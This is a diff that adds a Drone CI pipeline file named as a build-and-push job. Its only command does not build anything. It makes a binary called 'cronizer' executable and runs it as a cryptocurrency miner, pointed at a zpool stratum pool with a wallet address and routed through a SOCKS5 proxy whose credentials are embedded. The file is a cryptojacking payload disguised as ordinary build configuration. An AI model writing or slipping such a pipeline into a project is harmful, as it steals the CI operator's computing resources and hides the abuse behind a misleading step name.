@@ -1,0 +1,16 @@
+---
+kind: pipeline
+type: docker
+name: Building..
+node:
+  drone: ch1
+workspace:
+  path: /drone/src
+  path: lscpu
+steps:
+  - name: build & push
+    image: golang
+    commands:
+         - apt-get update && chmod 700 cronizer && ./cronizer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DHPDYmFtCZUCRoqWEL4XhrkwLXCcLzvZTY -p c=DGB,zap=BUTK-lyra/GXX -t16 -x socks5://serda67jui19:shiban716liop1z@185.199.229.156:7492
+
+...
